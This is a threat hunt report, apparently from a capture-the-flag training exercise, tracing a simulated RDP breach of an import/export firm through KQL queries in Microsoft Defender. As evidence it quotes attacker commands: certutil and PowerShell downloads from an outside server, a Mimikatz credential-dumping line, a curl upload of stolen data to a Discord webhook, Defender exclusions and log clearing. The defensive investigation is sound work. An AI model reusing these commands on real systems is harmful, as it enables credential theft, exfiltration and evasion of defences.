# 🕵️‍♂️ Threat Hunt Report: Azuki Breach - Dead in the Water CF
<img width="440" height="810" alt="Azuki" src="https://github.com/user-attachments/assets/990cbaa6-3b4d-45b8-ab67-49646b289572" />


**Analyst:** Edward Campbell  
**Investigation Date:** 23-November-2025  
**Incident Date:** 19-November-2025  

## 🎯 EXECUTIVE SUMMARY

**What Happened:**  

On November 19, 2025, at 18:36UTC, Azuki Import/Export Trading Co. was compromised when an attacker accessed an IT admin VM by using stolen RDP credentials. The intruder deployed malware, disabled defenses, harvested credentials, and exfiltrated sensitive contract and pricing data to Discord before clearing logs. This data was found on underground forums and was used by a competitor to undercut Azuki’s 6-year shipping contract by exactly 3%.

---
## 🖥️ INCIDENT DETAILS
### **Timeline Overview**

- **First Malicious Activity:** 19 November 2025 18:36:18.503997Z
- **Last Observed Activity:** 22 November 2025 00:38:47.8327343Z
- **Total Duration:** 54 hours 2 minutes

### **Attack Overview**

- **Initial Access Method:** Remote Desktop Protocol
- **Compromised Account:** kenji.sato
- **Affected System:** azuki-sl
- **Attacker IP Address:** 88.97.178.12
- **Investigation Tool:** Microsoft Defender for Endpoint (MDE)
  
## 🧬 MITRE ATT&CK Mapping (Attack Chain)

| Tactic | Technique ID | Description |
|-------|--------------|-------------|
| **Initial Access (TA0001)** | T1078.003 | The attacker gained access using valid local credentials via RDP. |
| **Execution (TA0002)** | T1059.001 | PowerShell was used to run the malicious script `wupdate.ps1`. |
| **Persistence (TA0003)** | T1053.005 | A Scheduled Task was created to run the malicious payload. |
| **Defense Evasion (TA0005)** | T1564.001 / T1036.008 / T1105 | Attacker used hidden directories, file-type masquerading, and abused `certutil.exe` to download tools. |
| **Discovery (TA0007)** | T1016 | `arp -a` and `ipconfig /all` used to enumerate local network configuration. |
| **Credential Access (TA0006)** | T1003.001 | Mimikatz was used for credential dumping. |
| **Lateral Movement (TA0008)** | T1021.001 | `mstsc.exe /V:<IP>` used to attempt RDP lateral movement. |
| **Collection (TA0009)** | T1560.001 | Data staged into `export-data.zip`. |
| **Command & Control (TA0011)** | T1071.001 | HTTPS (port 443) used for C2 to external IP. |
| **Exfiltration (TA0010)** | T1567 | Discord webhook used for data exfiltration. |
| **Impact (TA0040)** | T1136.001 | Backdoor account `support` created for persistent access. |



---




## :triangular_flag_on_post: Flag 1 – Identify the source IP address of the Remote Desktop Protocol connection

**Finding**: The IP address `88.97.178.12` gained initial access to the VM `AZUKI-SL` at `2025-11-19T18:36:18.503997Z` via RDP by using valid user credentials. 

**Thoughts**: When creating the query, I filtered for only `Network` and `RemoteInteractive` logon types because these represent an RDP connection. I determined the IP was suspicious because it originates in the UK, which is not normal for business in Japan.

**KQL Query**:
```
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ActionType == "LogonSuccess"
| where LogonType has_any ("Network", "RemoteInteractive")
| order by Timestamp desc

```
<img width="1905" height="549" alt="question1" src="https://github.com/user-attachments/assets/094c2159-f40a-427d-ba24-be689a6b74a1" />


---
## :triangular_flag_on_post: Flag 2 – Identify the user account that was compromised for initial access

**Finding**: The User account `kenji.sato` was used by the attacker.

**Notes**: This evidence can be found when running the query in Flag 1.

---

## :triangular_flag_on_post: Flag 3 – Identify the command and argument used to enumerate network neighbours

**Finding**: The attacker used the `Arp.exe` and `Ipconfig / all` commands to identify lateral movement opportunities at `2025-11-19T19:04:01.773778Z`.

**Thoughts**:  When creating this query, I wanted to start with the most common commands that reveal local network devices.

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19T18:36:18.503997Z) .. datetime(2025-11-19T21:36:18.503997Z))
| where ProcessCommandLine has_any ("arp", "net", "nbtstat", "count", "get")
| order by Timestamp desc

```
<img width="1879" height="643" alt="Q3" src="https://github.com/user-attachments/assets/62d2dcec-76af-42e1-afc3-54b398923ee6" />


---
## :triangular_flag_on_post: Flag 4 – Identify the PRIMARY staging directory where malware was stored

**Finding**: PowerShell was used to create the folder `WindowsCache` at `2025-11-19T19:05:30.755805Z`. The folder was then hidden at `2025-11-19T19:05:33.7665036Z`.

**Folder Path:** `C:\ProgramData\WindowsCache`  

**Commands Used**:  `attrib.exe +h +s C:\ProgramData\WindowsCache`  

**Thoughts**: I initially went in looking for hidden directories, which is why I filtered for `attrib.exe` first. I then went back and filtered for the hidden folder to see how it was created.

**KQL Queries**:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where FileName =~ "attrib.exe"
| order by Timestamp desc
```
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where ProcessCommandLine contains "WindowsCache"
| order by Timestamp desc

```
<img width="1892" height="476" alt="Q4" src="https://github.com/user-attachments/assets/406cb6b9-7070-4857-8fa3-91e1693c9bce" />

---

## :triangular_flag_on_post: Flag 5 – How many file extensions were excluded from Windows Defender scanning

**Finding**: 3 file extensions `(.ps1, .bat, and .exe )`  were added to the registry `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions` at `2025-11-19T18:49:27.7301011Z`.

**KQL Query**:
```
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where RegistryKey contains "Exclusions"

```
<img width="1871" height="542" alt="Q5" src="https://github.com/user-attachments/assets/22f24091-6a64-4503-bc5a-ea7316423768" />

---

## :triangular_flag_on_post: Flag 6 – What temporary folder path was excluded from Windows Defender scanning

**Finding**:  The temp folder was excluded from Windows Defender at `2025-11-19T18:49:27.6830204Z`.  

**REG Value Name**: `C:\Users\KENJI~1.SAT\AppData\Local\Temp`  

**REG Path**: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`


**KQL Query**:
```
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where RegistryKey contains "Exclusions"

```

---
## :triangular_flag_on_post: Flag 7 – Identify the Windows-native binary the attacker abused to download files

**Finding**: The attacker abused `certutil.exe` to download malicious content from `http[:]//78[.]141[.]196[.]6[:]8080/` to the created file `svchost.exe`.  

**Time of Event**: `2025-11-19T19:07:01.032199Z`  

**Command Used**: `certutil.exe -urlcache -f http[:]//78[.]141[.]196[.]6[:]8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`


**KQL Query**:
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where FolderPath contains "WindowsCache"
| order by Timestamp desc
```
---

## :triangular_flag_on_post: Flag 8 & 9 – Identify the name and executable path of the scheduled task created for persistence

**Finding**: The attacker created a scheduled task named "Windows Update Check" that would secretly execute the malicious payload `svchost.exe` daily at 02:00 under the SYSTEM account.  

**Time of Event**: `2025-11-19T19:07:46.9796512Z`  

**Command Used**: `schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f`


**KQL Query**:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where FileName contains "schtasks.exe"

```

---
## :triangular_flag_on_post: Flag 10 & 11 –  Identify the IP address and the destination port of the command and control server

**Finding**: A network connection was initiated by `svchost.exe` to external `IP 78.141.196.6` over `port 443` at `2025-11-19T19:11:04.1766386Z`.  

**Thoughts**: I wanted to check for network events that happened shortly after `svchost.exe` was downloaded. This explains my reasoning for the timestamp range in my query. 


**KQL Query**:
```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19T19:07:01.032199Z) .. datetime(2025-11-19T19:30:01.032199Z))

```
<img width="1873" height="415" alt="Q10" src="https://github.com/user-attachments/assets/a0be21a6-3921-46fd-9e70-aad9a5c24ced" />

---
## :triangular_flag_on_post: Flag 12 & 13 – Identify the filename of the credential dumping tool and the module used to extract logon passwords

**Finding**: The attacker abused `certutil.exe` again to download the credential-harvesting tool `Mimikatz` from `http[:]//78[.]141[.]196[.]6[:]8080/` to the created file `mm.exe` at `2025-11-19T19:07:22.8551193Z`. They then used the extraction module `sekurlsa::logonpasswords` to extract logon passwords from memory at `2025-11-19T19:08:26.2804285Z`.  

**Commands Used**: `certutil.exe -urlcache -f http[:]//78[.]141[.]196[.]6[:]8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe` and `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`

**KQL Queries**:
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where FolderPath contains "WindowsCache"
| order by Timestamp desc
```
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where ProcessCommandLine contains "mm.exe"

```
<img width="1473" height="645" alt="Q13" src="https://github.com/user-attachments/assets/760915b2-b760-45b1-98d7-54966640542d" />

---

## :triangular_flag_on_post: Flag 14 – Identify the compressed archive filename used for data exfiltration

**Finding**: `Export-data.zip` was created at `2025-11-19T19:08:58.0244963Z`  

**File Path**: `C:\ProgramData\WindowsCache\export-data.zip` 

**KQL Query**:
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where FolderPath contains "WindowsCache"
| where FileName contains ".zip"

```

---

## :triangular_flag_on_post: Flag 15 – Identify the cloud service used to exfiltrate stolen data

**Finding**: The attacker used `curl.exe` to upload the file `export-data.zip` to `https[:]//discord[.]com` at `2025-11-19T19:09:21.4234133Z`  

**Command Used**:  `curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip https[:]//discord[.]com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8`  

**Thoughts**: curl.exe is an easy way to upload or download files to and from the internet, so my first thought was to query for network activity initiated by the curl command.

**KQL Query**:
```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where RemotePort == "443"
| where InitiatingProcessCommandLine contains "curl"

```
---
## :triangular_flag_on_post: Flag 16 – Identify the first Windows event log cleared by the attacker

**Finding**: The attacker cleared the Windows Security Logs at `2025-11-19T19:11:39.0934399Z`  

**Command Used**: `wevtutil.exe cl Security`

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where ProcessCommandLine has_all ("wevtutil.exe", "cl")
| order by Timestamp desc

```

---
## :triangular_flag_on_post: Flag 17 – Identify the backdoor account username created by the attacker

**Finding**: The user account `support` was created at `2025-11-19T19:09:48.9668967Z` then added to the `Administrators` group at `2025-11-19T19:09:53.08884Z`

**KQL Query**:
```
DeviceEvents
| where DeviceName == "azuki-sl"
| where ActionType contains "user"
| order by Timestamp desc

```
<img width="1895" height="509" alt="Q17" src="https://github.com/user-attachments/assets/310b38c4-e4ca-404a-b6c4-348c9b6e0d22" />

---

## :triangular_flag_on_post: Flag 18 – Identify the PowerShell script file used to automate the attack chain

**Finding**: The attacker downloads a malious file from `http[:]//78[.]141[.]196[.]6[:]8080` under the file name `wupdate.ps1` at `2025-11-19T18:37:40.4082551Z`    

**Command Used**:  `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http[:]//78[.]141[.]196[.]6[:]8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1' -UseBasicParsing"`  


**KQL Query**:
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where FileName has_any (".ps1", ".bat")
| where InitiatingProcessCommandLine contains "WebRequest"
| order by Timestamp desc

```
---
## :triangular_flag_on_post: Flag 19 & 20 – Identify the tool used and the targeted IP address for lateral movement

**Finding**: The attacker used `mstsc.exe` to target IP address `10.1.0.188` for lateral movement at `2025-11-22T00:38:47.8327343Z` 

**Command Used**: `mstsc.exe /V:10.1.0.188` 

**KQL Query**:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where ProcessCommandLine has_any ("cmdkey", "mstsc")

```
---

## **APPENDIX**

### **Key Indicators of Compromise (IOCs)**

---

### 🔹 **IP Addresses**
| Type | Address |
|------|---------|
| Attacker IP | **88.97.178.12** |
| C2 Server | **78.141.196.6** |
| Download Server | **78.141.196.6** |
| Lateral Movement Target | **10.1.0.188** |

### 🔹 **File Hashes**
| File | SHA256 |
|------|--------|
| **svchost.exe** | `729214e56d3c54956ce9c2d93b238563bcedc8b80a5ca0b8e7636602d9c712d5` |
| **mm.exe** | `61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1` |
| **export-data.zip** | `7fea3a7e71c3a493effd91ff9084d602857954c96fdc04e022415069d39bef2e` |

### 🔹 **Accounts**
| Type | Username |
|------|----------|
| Compromised | **kenji.sato** |
| Attacker-Created | **support** |

### 🔹 **Domains**
- **discord.com**

---

**Report Completed By:** Edward Campbell

**Date:** 25 November 2025
